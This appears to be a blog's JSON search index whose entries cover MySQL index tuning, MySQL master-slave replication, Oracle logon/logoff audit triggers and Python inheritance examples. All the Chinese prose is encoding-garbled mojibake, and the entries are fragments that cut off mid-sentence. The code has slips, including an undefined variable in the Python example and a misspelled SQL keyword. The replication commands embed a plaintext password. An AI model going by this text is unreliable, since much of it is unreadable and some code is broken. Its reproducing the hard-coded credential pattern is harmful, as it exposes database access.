ä¸ºå¸¸ä½œä¸ºæŸ¥è¯¢æ¡ä»¶çš„å­—æ®µå»ºç«‹ç´¢å¼•(é‡ç‚¹å…³æ³¨) å¦‚æœæŸä¸ªå­—æ®µç»å¸¸ç”¨æ¥åšæŸ¥è¯¢æ¡ä»¶ï¼Œé‚£ä¹ˆè¯¥å­—æ®µçš„æŸ¥è¯¢é€Ÿåº¦ä¼šå½±å“æ•´ä¸ªè¡¨çš„æŸ¥è¯¢é€Ÿåº¦ã€‚å› æ­¤ï¼Œä¸ºè¿™æ ·çš„å­—æ®µå»ºç«‹ç´¢å¼•ï¼Œå¯ä»¥æé«˜æ•´ä¸ªè¡¨çš„æŸ¥è¯¢é€Ÿåº¦ã€‚ å°½é‡ä½¿ç”¨å‰ç¼€æ¥ç´¢å¼•(é‡ç‚¹å…³æ³¨) å¦‚æœç´¢å¼•å­—æ®µçš„å€¼å¾ˆé•¿ï¼Œæœ€å¥½ä½¿ç”¨å€¼çš„å‰ç¼€æ¥ç´¢å¼•ã€‚ä¾‹å¦‚ï¼ŒTEXTå’ŒBLOGç±»å‹çš„å­—æ®µï¼Œè¿›è¡Œå…¨æ–‡æ£€ç´¢ä¼šå¾ˆæµªè´¹æ—¶é—´ã€‚å¦‚æœåªæ£€ç´¢å­—æ®µçš„å‰é¢çš„è‹¥å¹²ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å¯ä»¥æé«˜æ£€ç´¢é€Ÿåº¦ã€‚ é™åˆ¶ç´¢å¼•çš„æ•°ç›® ç´¢å¼•çš„æ•°ç›®ä¸æ˜¯è¶Šå¤šè¶Šå¥½ã€‚æ¯ä¸ªç´¢å¼•éƒ½éœ€è¦å ç”¨ç£ç›˜ç©ºé—´ï¼Œç´¢å¼•è¶Šå¤šï¼Œéœ€è¦çš„ç£ç›˜ç©ºé—´å°±è¶Šå¤§(æŸ¥è¯¢æ˜¯IOæ¶ˆè€—å¤§)ã€‚ä¿®æ”¹è¡¨æ—¶ï¼Œå¯¹ç´¢å¼•çš„é‡æ„å’Œæ›´æ–°å¾ˆéº»çƒ¦ã€‚è¶Šå¤šçš„ç´¢å¼•ï¼Œä¼šä½¿æ›´æ–°è¡¨å˜å¾—å¾ˆæµªè´¹æ—¶é—´ã€‚ å°½é‡ä½¿ç”¨æ•°æ®é‡å°‘çš„ç´¢å¼• å¦‚æœç´¢å¼•çš„å€¼å¾ˆé•¿ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„é€Ÿåº¦ä¼šå—åˆ°å½±å“ã€‚ä¾‹å¦‚ï¼Œå¯¹ä¸€ä¸ªCHARï¼ˆ100ï¼‰ç±»å‹çš„å­—æ®µè¿›è¡Œå…¨æ–‡æ£€ç´¢éœ€è¦çš„æ—¶é—´è‚¯å®šè¦æ¯”å¯¹CHARï¼ˆ10ï¼‰ç±»å‹çš„å­—æ®µéœ€è¦çš„æ—¶é—´è¦å¤šã€‚ åˆ é™¤ä¸å†ä½¿ç”¨æˆ–è€…å¾ˆå°‘ä½¿ç”¨çš„ç´¢å¼• è¡¨ä¸­çš„æ•°æ®è¢«å¤§é‡æ›´æ–°ï¼Œæˆ–è€…æ•°æ®çš„ä½¿ç”¨æ–¹å¼è¢«æ”¹å˜åï¼ŒåŸæœ‰çš„ä¸€äº›ç´¢å¼•å¯èƒ½ä¸å†éœ€è¦ã€‚æ•°æ®åº“ç®¡ç†å‘˜åº”å½“å®šæœŸæ‰¾å‡ºè¿™äº›ç´¢å¼•ï¼Œå°†å®ƒä»¬åˆ é™¤ï¼Œä»è€Œå‡å°‘ç´¢å¼•å¯¹æ›´æ–°æ“ä½œçš„å½±å“ã€‚ 1.1.3.2. å¼€å‘è§„èŒƒ(è‰ç¨¿) ä¸èµ°ç´¢å¼•çš„æƒ…å†µï¼š é‡ç‚¹å…³æ³¨ï¼š æ²¡æœ‰æŸ¥è¯¢æ¡ä»¶ï¼Œæˆ–è€…æŸ¥è¯¢æ¡ä»¶æ²¡æœ‰å»ºç«‹ç´¢å¼• select * from tab; å…¨è¡¨æ‰«æã€‚ select * from tab where 1=1; åœ¨ä¸šåŠ¡æ•°æ®åº“ä¸­ï¼Œç‰¹åˆ«æ˜¯æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨ã€‚ æ˜¯æ²¡æœ‰å…¨è¡¨æ‰«æè¿™ç§éœ€æ±‚ã€‚ å¯¹ç”¨æˆ·æŸ¥çœ‹æ˜¯éå¸¸ç—›è‹¦çš„ã€‚ å¯¹æœåŠ¡å™¨æ¥è®²æ¯ç­æ€§çš„ã€‚ select * from tab; SQLæ”¹å†™æˆä»¥ä¸‹è¯­å¥ï¼š selec * from tab order by price limit 10 # éœ€è¦åœ¨priceåˆ—ä¸Šå»ºç«‹ç´¢å¼• select * from tab where name='zhangsan' # nameåˆ—æ²¡æœ‰ç´¢å¼• æ”¹ï¼š æ¢æˆæœ‰ç´¢å¼•çš„åˆ—ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ å°†nameåˆ—å»ºç«‹ç´¢å¼• æŸ¥è¯¢ç»“æœé›†æ˜¯åŸè¡¨ä¸­çš„å¤§éƒ¨åˆ†æ•°æ®ï¼Œåº”è¯¥æ˜¯30ï¼…ä»¥ä¸Šã€‚ æŸ¥è¯¢çš„ç»“æœé›†ï¼Œè¶…è¿‡äº†æ€»æ•°è¡Œæ•°30%ï¼Œä¼˜åŒ–å™¨è§‰å¾—å°±æ²¡æœ‰å¿…è¦èµ°ç´¢å¼•äº†ã€‚ å‡å¦‚ï¼štabè¡¨ idï¼Œname id:1-100w ï¼Œidåˆ—æœ‰ç´¢å¼• select * from tab where id\u003e500000; å¦‚æœä¸šåŠ¡å…è®¸ï¼Œå¯ä»¥ä½¿ç”¨limitæ§åˆ¶ã€‚ æ€ä¹ˆæ”¹å†™ ï¼Ÿ ç»“åˆä¸šåŠ¡åˆ¤æ–­ï¼Œæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼ã€‚å¦‚æœæ²¡æœ‰æ›´å¥½çš„æ”¹å†™æ–¹æ¡ˆ å°½é‡ä¸è¦åœ¨mysqlå­˜æ”¾è¿™ä¸ªæ•°æ®äº†ã€‚æ”¾åˆ°redisé‡Œé¢ã€‚ ç´¢å¼•æœ¬èº«å¤±æ•ˆï¼Œç»Ÿè®¡æ•°æ®ä¸çœŸå® ç´¢å¼•æœ‰è‡ªæˆ‘ç»´æŠ¤çš„èƒ½åŠ›ã€‚ å¯¹äºè¡¨å†…å®¹å˜åŒ–æ¯”è¾ƒé¢‘ç¹çš„æƒ…å†µä¸‹ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°ç´¢å¼•å¤±æ•ˆã€‚ æŸ¥è¯¢æ¡ä»¶ä½¿ç”¨å‡½æ•°åœ¨ç´¢å¼•åˆ—ä¸Šï¼Œæˆ–è€…å¯¹ç´¢å¼•åˆ—è¿›è¡Œè¿ç®—ï¼Œè¿ç®—åŒ…æ‹¬(+ï¼Œ-ï¼Œ*ï¼Œ/ï¼Œ! ç­‰) ä¾‹å­ï¼š é”™è¯¯çš„ä¾‹å­ï¼šselect * from test where id-1=9; æ­£ç¡®çš„ä¾‹å­ï¼šselect * from test where id=10; éšå¼è½¬æ¢å¯¼è‡´ç´¢å¼•å¤±æ•ˆ.è¿™ä¸€ç‚¹åº”å½“å¼•èµ·é‡è§†.ä¹Ÿæ˜¯å¼€å‘ä¸­ç»å¸¸ä¼šçŠ¯çš„é”™è¯¯. ç”±äºè¡¨çš„å­—æ®µtu_mdnå®šä¹‰ä¸ºvarch","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:0:0","tags":["linux","mysql"],"title":"Mysqlä¼˜åŒ–","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlä¸»ä»å¤åˆ¶","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/","tags":["linux","mysql"],"title":"Mysqlä¸»ä»å¤åˆ¶","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å‰æ éœ€è¦å¤šä¸ªå®ä¾‹ æ¯å°å®ä¾‹server_idä¸åŒ éœ€è¦å¼€å¯äºŒè¿›åˆ¶æ—¥å¿— ä¸»åº“éœ€è¦æä¾›å¤åˆ¶ç›¸å…³çš„ç”¨æˆ·æƒé™(replication slave) ä»åº“éœ€è¦å°†å’Œä¸»åº“ç›¸å·®çš„æ•°æ®è¿›è¡Œè¿½åŠ ,ä¸€èˆ¬å…ˆå¤‡ä»½ä¸»åº“æ•°æ®æ¢å¤åˆ°ä»åº“,ç„¶ååœ¨è¿›è¡ŒåŒæ­¥ ä»åº“åº”è¯¥ä»æ¢å¤ä¹‹åçš„æ—¶é—´ç‚¹å¼€å§‹è‡ªåŠ¨ä»ä¸»åº“è·å–æœ€æ–°çš„äºŒè¿›åˆ¶æ—¥å¿— 2. å¤åˆ¶ä¸­çš„çº¿ç¨‹ ä¸»åº“ Dump thread: åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­,ä¸»åº“å‘é€äºŒè¿›åˆ¶æ—¥å¿—çš„çº¿ç¨‹ binlogæ–‡ä»¶ : ä¸»åº“çš„äºŒè¿›åˆ¶æ–‡ä»¶ ä»åº“ IO thread : å‘ä¸»åº“è¯·æ±‚äºŒè¿›åˆ¶æ—¥å¿—,å¹¶æ¥æ”¶äºŒè¿›åˆ¶æ—¥å¿—çš„çº¿ç¨‹ SQL thread : æ‰§è¡Œè¯·æ±‚è¿‡æ¥çš„äºŒè¿›åˆ¶çš„çº¿ç¨‹ relaylog : ä¸­ç»§æ—¥å¿—,å­˜å‚¨è¯·æ±‚è¿‡æ¥çš„äºŒè¿›åˆ¶æ—¥å¿— master.info: ä»åº“è¿æ¥ä¸»åº“çš„é‡è¦å‚æ•°(user,passwd,ip,port);ä¸Šæ¬¡è·å–è¿‡çš„ä¸»åº“çš„äºŒè¿›åˆ¶æ—¥å¿—ä½ç½® relay-log.info: å­˜å‚¨ä»åº“SQLçº¿ç¨‹å·²ç»æ‰§è¡Œè¿‡çš„relaylogæ—¥å¿—ä½ç½® 3. ä¸»ä»å¤åˆ¶åŸç† ä»åº“é€šè¿‡IOçº¿ç¨‹,è¯»å–master.infoä¸­çš„ä¿¡æ¯,è·å–åˆ°è¿æ¥åŠä¸Šæ¬¡è¯·æ±‚ä¸»åº“çš„binlogçš„ä½ç½®,ç„¶åIOçº¿ç¨‹ä½¿ç”¨è·å–åˆ°çš„è¿æ¥è¿æ¥åˆ°ä¸»åº“,ä¸»åº“è·å–åˆ°ä»åº“å‘æ¥çš„ä½ç½®ä¿¡æ¯å’Œç°æœ‰äºŒè¿›åˆ¶æ—¥å¿—è¿›è¡Œå¯¹æ¯”,å¦‚æœæœ‰æ–°äºŒè¿›åˆ¶æ—¥å¿—,ä¼šé€šè¿‡dump threadå‘é€ç»™ç›¸å…³ä¿¡æ¯ç»™ä»åº“,ä»åº“é€šè¿‡IOçº¿ç¨‹,æ¥å—ä¸»åº“å‘æ¥çš„äºŒè¿›åˆ¶æ—¥å¿—å,å­˜å‚¨åˆ°TCP/IPç¼“å­˜ä¸­,å¹¶è¿”å›ACKç¡®è®¤ç»™ä¸»åº“,ä¸»åº“æ”¶åˆ°ACKå,å°±è®¤ä¸ºä»»åŠ¡å¤åˆ¶å®Œæˆäº†,å¯ä»¥ç»§ç»­å…¶ä»–å·¥ä½œã€‚ä»åº“æ­¤æ—¶å°†æ›´æ–°master.infoçš„äºŒè¿›åˆ¶ä½ç½®ä¿¡æ¯,IOçº¿ç¨‹ä¼šå°†TCP/IPç¼“å­˜ä¸­çš„æ—¥å¿—ï¼Œä¼šå­˜å‚¨åˆ°relay-logæ—¥å¿—æ–‡ä»¶ä¸­ã€‚ç„¶åSQLçº¿ç¨‹è¯»å–relay-log.infoä¸Šæ¬¡æ‰§è¡Œåˆ°çš„æ—¥å¿—ä½ç½®(æ­¤ä½ç½®ä¿¡æ¯ä¸ä¸€å®šä¸binlogæ—¥å¿—ä½ç½®ç›¸åŒ),ä»¥è¿™ä¸ªæ—¥å¿—ä½ç½®ä¸ºèµ·ç‚¹ç»§ç»­æ‰§è¡Œrelay-logæ—¥å¿—ã€‚SQLçº¿ç¨‹æ‰§è¡Œå®Œæˆæ‰€æœ‰relayä¹‹åï¼Œä¼šæ›´æ–°relay-log.infoä¿¡æ¯ä¸ºæ–°çš„ä½ç½®ä¿¡æ¯ã€‚ï¼ˆè‡³æ­¤ä¸€æ¬¡å¤åˆ¶å®Œæˆï¼‰ 4. ä¸»ä»å¤åˆ¶å®è·µ 4.1. my.cnf # ç¦ç”¨dnsè§£æ(åªèƒ½ä½¿ç”¨ip) skip-name-resolve # äºŒè¿›åˆ¶æ—¥å¿—æ§åˆ¶ server_id = 10 # æ¯ä¸ªèŠ‚ç‚¹idä¸åŒ log-bin = /data/mysql57/3307/binlog/mysql-bin binlog_format = row 4.2. å¤‡ä»½ $\u003e mysqldump --defaults-file=/data/mysql57/3307/etc/my.cnf -A -R -B --triggers --master-data=2 --single-transaction \u003e /tmp/aa.sql $\u003e sed -n '22p' /tmp/aa.sql -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596; 4.3. æˆæƒ $\u003e grant replication slave on *.* to repl@'10.0.2.%' identified by 'gC74lgK9sSkzwBbrztd3'; $\u003e flush privileges; 4.4. å¤‡åº“å¯¼å…¥æ•°æ® $\u003e mysql \u003c /tmp/aa.sql 4.5. å¤‡åº“æŒ‡å®šä¸ä¸»åº“çš„åŒæ­¥ä¿¡æ¯å¹¶å¯åŠ¨åŒæ­¥ --- æŒ‡å®šåŒæ­¥è¿æ¥ä¿¡æ¯(ä»åº“) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596, MASTER_CONNECT_RETRY=3; --- è‹¥åˆæ¬¡æ­å»ºåˆ™(æˆ–ä»0å¼€å§‹å…¨åŒæ­¥) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_AUTO_POSITION=1; --- å¯åŠ¨åŒæ­¥ mysql\u003e start slave --- æŸ¥çœ‹å¯åŠ¨çŠ¶æ€ mysql\u003e show slave status\\G 4.6. ä¸»ä»çŠ¶æ€ä¿¡æ¯ä»‹ç» mysql\u003e show slave status\\G Slave_IO_Running | Yes Slave_SQL_Running | Yes ## æœ€åä¸€æ¬¡IOçš„é”™è¯¯å·ç  Last_IO_Errno | 0 ## æœ€åä¸€æ¬¡IOçš„é”™è¯¯ä¿¡æ¯ Last_IO_Error | ## æœ€åä¸€æ¬¡SQLçš„é”™è¯¯å·ç  Last_SQL_Errno | 0 ## æœ€åä¸€æ¬¡SQLçš„é”™è¯¯ä¿¡æ¯ Last_SQL_Error | ## ä»åº“(åŒæ­¥)è½åäºä¸»åº“çš„ç§’æ•° Seconds_Behind_Master | 0 4.6.1. IOçº¿ç¨‹æ•…éšœ ä¸»åº“è¿æ¥ä¸ä¸Š: é˜²ç«å¢™ã€ç½‘ç»œã€è¿æ¥ä¿¡æ¯é”™è¯¯(ipã€passwdã€portã€user)ã€åŸŸåè§£æ(skip-name-resolve) è§£å†³æ–¹æ¡ˆ: mysql\u003e stop slave; mysql\u003e reset slave all; mysql\u003e change master to ....; mysql\u003e start slave; ä¸»åº“äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ä¸¢å¤±æˆ–æŸå è§£å†³æ–¹æ¡ˆ: é‡æ–°å¤‡ä»½æ¢å¤ï¼Œåœ¨é‡æ–°æ„å»ºä¸»ä» 4.6.1.1. æ¡ˆä¾‹1 ä¸»ä»åŒæ­¥å‡ºç°IOæ•…éšœã€‚å¯¼è‡´åŸå› ï¼Œä¸»åº“ä¿®æ”¹äº†ç«¯å£å· è§£å†³æ–¹æ¡ˆ: ä»åº“ slow slave status\\Gï¼Œç¡®è®¤æ•…éšœ è®°å½•Master_Log_Fileå’ŒRead_Master_Log_Poså€¼ stop slave reset slave all change master to ... start slave 4.6.1.2. æ¡ˆä¾‹2 ä¸»åº“çš„äºŒè¿›åˆ¶æ—¥å¿—è¢«æ¸…ç†(1.reset master;2.binlogæ–‡ä»¶æ‰¾ä¸åˆ°/æŸå/æ–­èŠ‚/ç‰©ç†åˆ é™¤/åå­—è¢«ä¿®æ”¹ç­‰),ä»åº“è¯·æ±‚æ—¥å¿—å‡ºç°Slave_IO_Running: No(Last_IO_Error: xxxx could not find next log;the first evnet 'mysql-bin.xxxxx') è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨å¤‡ä»½æ¢å¤ï¼Œé‡æ–°åˆå§‹åŒ–ä¸»ä» 4.6.2. SQL çº¿ç¨‹æ•…éšœ æ‰§è¡Œreplaylogæ—¥å¿—æ–°äº‹ä»¶æ—¶,æ¯”å¦‚å¢åŠ ã€åˆ é™¤åº“æˆ–æ•°æ®æ—¶ï¼Œä»åº“å·²ç»å­˜åœ¨æˆ–å·²ç»ä¸¢å¤±äº†å°†è¦æ“ä½œçš„æ•°æ® è§£å†³æ–¹æ¡ˆ: ## 1. ç›´æ¥é‡å»ºä¸»ä»åŒæ­¥(æ¨è) ## 2. ä¸€åˆ‡ä»¥ä¸»åº“ä¸ºå‡†ï¼Œåˆ›å»ºå¤±è´¥æ—¶å€™åˆ é™¤ä»åº“å¤šä½™çš„é‡å¯åŒæ­¥å³å¯ ## 3. æ‰§è¡Œå¿½ç•¥æ“ä½œ(æ­¤æ“ä½œæœ‰ä¸€å®šé£é™©ï¼Œå‡ºéæ˜ç¡®çŸ¥é“åœ¨å¹²ä»€ä¹ˆï¼Œå¦åˆ™ä¸å»ºè®®ä½¿ç”¨) mysql\u003e stop slave; mysql\u003e set global sql_slave_skip_counter = 1; ## å°†åŒæ­¥ç§»åŠ¨è‡³ä¸‹ä¸€ä¸ªæ“ä½œï¼Œå¦‚æœå¤šæ¬¡ä¸åŒæ­¥ï¼Œå¯é‡å¤æ“ä½œæ­¤é¡¹ mysql\u003e start slave; ## 4. åŒ3,åªæ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å¿½ç•¥å¯¹åº”ç¼–ç  $\u003e vim my.cnf slave-skip-errors = 1032,1062,1007 ## 5. ä¸ºé˜²æ­¢SQLçº¿ç¨‹æ•…éšœï¼Œä¸€èˆ¬ä¼šè®¾ç½®ä»åº“åªè¯»(åªé’ˆå¯¹æ™®é€šç”¨æˆ·) mysql\u003e set global read_only=1; ## $\u003e my.cnf: read_only=1 4.7. å»¶è¿ŸåŒæ­¥(æ•…éšœ) show slave status\\G Seconds_Behind_Master: ä¸»ä»å»¶æ—¶æ—¶é—´(s) 4.7.1. å¦‚ä½•é¿å…å»¶è¿ŸåŒæ­¥ sync_binlog=1,0(é»˜è®¤):äº‹åŠ¡æäº¤ä¸ç«‹å³å†™å…¥ç£ç›˜ï¼Œé æ“ä½œç³»ç»Ÿåˆ¤æ–­ä»€ä¹ˆæ—¶å€™å†™å…¥;1:æ¯æ¬¡æäº¤äº‹åŠ¡éƒ½ç«‹å³åˆ·æ–°binlongåˆ°ç£ç›˜; ä¸»åº“å¤§äº‹åŠ¡å¾ˆå¤šï¼Œæ‹†åˆ†ä¸ºå°äº‹åŠ¡,å¤šäº‹åŠ¡éš”ç¦» ä¸»åº“å¹¶å‘äº‹åŠ¡å¾ˆå¤šï¼Œä½¿ç”¨å¤š(sql)çº¿ç¨‹å¤åˆ¶ï¼Œé’ˆå¯¹ä¸åŒåº“çš„äº‹åŠ¡æ¥è¿›è¡Œå¹¶å‘(æœ‰å±€é™æ€§) ä½¿ç”¨å¤šçº§ä¸»ä»ï¼Œåˆ†åº“åˆ†è¡¨æ¶æ„ å°†binlog|relaylogæ”¾åˆ°é«˜æ€§èƒ½(ssd)ç£ç›˜ä¸Š ä¸»å¤‡ç¡¬ä»¶å°½é‡ä¸€è‡´ ä»åº“è¶Šå¤šï¼Œå‹åŠ›è¶Šå¤§(dump çº¿ç¨‹å‹åŠ›è¶Šå¤§) sql çº¿ç¨‹æ…¢ é»˜è®¤åªæœ‰ä¸€ä¸ªsqlçº¿ç¨‹ï¼Œä»åº“ä¸­çš„äº‹åŠ¡éƒ½æ˜¯ä¸€ä¸ªä¸€ä¸ªæ¥æ‰§è¡Œçš„ å¦‚æœä¸»åº“çš„å¹¶å‘äº‹åŠ¡å¾ˆå¤šå’Œå¤§äº‹åŠ¡ï¼Œéƒ½ä¼šé€ æˆä»åº“å»¶æ—¶ å¤š(sql)çº¿ç¨‹å¤åˆ¶ï¼Œæœ‰å±€é™æ€§ï¼Œé’ˆå¯¹ä¸åŒåº“çš„äº‹åŠ¡æ¥è¿›è¡Œå¹¶å‘ 4.8. å»¶è¿ŸåŒæ­¥(é«˜çº§) 4.8.1. é€»è¾‘æŸå å»¶è¿Ÿä»åº“ï¼šä»åº“è½åäºä¸»åº“ä¸€æ®µæ—¶é—´ SQLçº¿ç¨‹å»¶æ—¶ï¼Œæ•°æ®å·²ç»å†™å…¥åˆ°relaylogï¼ŒSQLçº¿ç¨‹æ…¢ç‚¹æ‰§è¡Œ -- ä»åº“æ‰§è¡Œ mysql\u003e stop slave ; mysql\u003e CHANGE MASTER TO MASTER_DELAY = 3600; -- å»ºè®®3-6å°æ—¶ mysql\u003e start slave ; æ¡ˆä¾‹: ä¸»åº“è¯¯æ“ä½œï¼Œåˆ åº“ åœæ­¢ä¸»åº“ä¸šåŠ¡ ç«‹å³åœæ­¢ä»åº“SQLçº¿ç¨‹ stop slave sql_thread; æ‰‹å·¥æ¨¡æ‹Ÿsqlçº¿ç¨‹å·¥ä½œï¼Œå¹¶æˆªæ­¢åˆ°è¯¯æ“ä½œä¹‹å‰ è¯»å–relay-log.info,è·å–åˆ°ä¸Šæ¬¡æ‰§è¡Œåˆ°çš„ä½ç½®,ä½œä¸ºç»§ç»­æ‰§è¡Œrelay-logçš„èµ·ç‚¹ï¼Œåˆ†ærelay-logå†…å®¹ï¼Œè·å–åˆ°è¯¯æ“ä½œçš„ä½ç½®ç‚¹ï¼Œæˆªå–è¿™æ®µæ—¥å¿—ï¼Œæ¢å¤åˆ°ä»åº“ æ‰¾åˆ°èµ·ç‚¹ä½ç½®show slave status\\G,Relay_Log_file:db01-relay-bin.000002;Relay_Log_Pos:283 æ‰¾åˆ°è¯¯åˆ é™¤çš„ä½","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:0:0","tags":["linux","mysql"],"title":"Mysqlä¸»ä»å¤åˆ¶","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"Oracle åˆ›å»ºç™»å½•å’Œé€€å‡ºçš„è§¦å‘å™¨","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/","tags":["linux","è§£å†³æ–¹æ¡ˆ","oracle"],"title":"Oracleåˆ›å»ºç™»å½•å’Œé€€å‡ºçš„è§¦å‘å™¨","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"åˆ›å»ºè§¦å‘è®°å½•è¡¨ create table log_table( username varchar2(20 ), logon_time date, logoff_time date, address varchar2(20 ) ); ç™»å½•è§¦å‘å™¨ create or replace trigger tr_logon after logon on DATABASE begin INSERT INTO log_table(username,logon_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / é€€å‡ºè§¦å‘å™¨ create or replace trigger tr_logoff before logoff on database begin INSERT INTO log_table(username,logoff_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / ","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","oracle"],"title":"Oracleåˆ›å»ºç™»å½•å’Œé€€å‡ºçš„è§¦å‘å™¨","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å‡½æ•°ç›¸å…³","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/","tags":["linux","python"],"title":"Python å‡½æ•°ç›¸å…³(äºŒ)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å¤šæ€ åŒä¸€ä¸ªæ–¹æ³•åœ¨ä¸åŒçš„ç±»ä¸­æœ€ç»ˆå‘ˆç°å‡ºä¸åŒçš„æ•ˆæœï¼Œå³ä¸ºå¤šæ€ã€‚ class demo1(object): def __init__(self,width,height): self.width = width self.height = height def getArea(self): area=self.width* self.height / 2 return area class demo2(object): def __init__(self,size): self.size = size def getArea(self): # åŒä¸€ä¸ªæ–¹æ³•åœ¨ä¸åŒçš„ç±»ä¸­æœ€ç»ˆå‘ˆç°å‡ºä¸åŒçš„æ•ˆæœï¼Œå³ä¸ºå¤šæ€ area = self.size * self.size return area a=demo1(5,5) print(a.getArea()) b=demo2(5) print(v.getArea()) 2. ç»§æ‰¿ é‡æ„ é‡å†™ é‡è½½ Pythonçš„ç»§æ‰¿æ²¡æœ‰ç±»ä¼¼javaä¸­çš„extendså…³é”®å­—ï¼Œå½“Pythonä¸­ä¸€ä¸ªç±»éœ€è¦ç»§æ‰¿å¦ä¸€ä¸ªç±»çš„æ—¶å€™,åªéœ€è¦å°†è¢«ç»§æ‰¿çš„ç±»é€šè¿‡å˜é‡å½¢å¼ä¼ é€’ç»™æ–°ç±»ï¼Œå³å¯å®Œæˆç»§æ‰¿ Pythonè¿˜å¯ä»¥å®ç°å¤šç»§æ‰¿ï¼Œå°†å¤šä¸ªè¢«ç»§æ‰¿ç±»é€šè¿‡å˜é‡å½¢å¼ä¼ é€’ç»™æ–°ç±»ï¼Œå³å¯å®Œæˆå¤šç»§æ‰¿ 2.1. é‡å†™ æ–¹æ³•åç›¸åŒï¼Œå‚æ•°ç›¸åŒï¼Œå†…å®¹ä¸åŒ 2.2. é‡è½½ æ–¹æ³•åå­—ç›¸åŒï¼Œå‚æ•°ä¸åŒ 3. ç»§æ‰¿æŸ¥è¯¢ Python2 ç»å…¸ç±»éƒ½æ˜¯æŒ‰ç…§æ·±åº¦ç±»æŸ¥è¯¢(åŠæ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•) Python2 æ–°å¼ç±»éƒ½æ˜¯æŒ‰ç…§å¹¿åº¦ç±»æŸ¥è¯¢(åŠå¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•) Python3 æ–°å¼ç±»å’Œç»å…¸ç±»éƒ½æ˜¯æŒ‰ç…§å¹¿åº¦ç±»æŸ¥è¯¢ 4. ç¤ºä¾‹ï¼š åªèƒ½è¯´æ˜¯å¯ä»¥ç”¨ï¼Œä½†è¿˜æ˜¯æœ‰å¾ˆå¤§éƒ¨åˆ†çš„ç–‘é—®ï¼Œåªèƒ½ç”¨ä»…å‰©çš„ä¸€ç‚¹javaè®°å¿†å¼ºè¡Œè§£é‡Šäº† class Farm(object): def __init__(self,name,addr): self.name = name self.addr = addr def Recruit(self,worker_obj): pass def BuyAnimal(self,animal_obj): pass def SellAnimal(self,animal_obj): pass def Resign(self,worker_obj): pass class FarmMember(Farm): def __init__(self,name,addr): # è¿™ç§ä¹Ÿåº”ç®—é‡è½½ super(FarmMember,self).__init__(name,addr) self.farmers = [] def Recruit(self, farmer_obj): # é‡å†™ print(\"ä¸ºå†œåœºç”³è¯·äº†ä¸€ä¸ªç®¡ç†å‘˜ %s \" % farmer_obj.name) self.farmers.append(farmer_obj) def Info(self): pass class Manager(FarmMember): def __init__(self,name,addr,age,sex): # é‡è½½ super(Manager, self).__init__(name, addr) self.age = age self.sex = sex self.workers = [] def Info(self): #é‡å†™ print(''' --- ç®¡ç†å‘˜ Info %s --- åå­— : %s å¹´é¾„ : %s æ€§åˆ« : %s åœ°å€ : %s '''%(self.name,self.name,self.age,self.sex,self.addr)) def Recruit(self,worker_obj): #é‡å†™ print(\"ç®¡ç†å‘˜æ‹›è˜äº†ä¸€ä¸ªåå« %s çš„å‘˜å·¥ \" % worker_obj.name) self.workers.append(worker_obj) def BuyAnimal(self,animal_obj): #é‡å†™ print(\"ç®¡ç†å‘˜è´­ä¹°äº† %s ä¸ª %s , èŠ±è´¹äº† %s å…ƒ\"%(animal_obj.num, animal_obj.name ,(animal_obj.num * animal_obj.price))) def SellAnimal(self,animal_obj): #é‡å†™ print(\"ç®¡ç†å‘˜å‡ºå”®äº†%s ä¸ª %s, å–äº† %s å…ƒ\" % (animal_obj.num, animal_obj.name,(animal_obj.num * 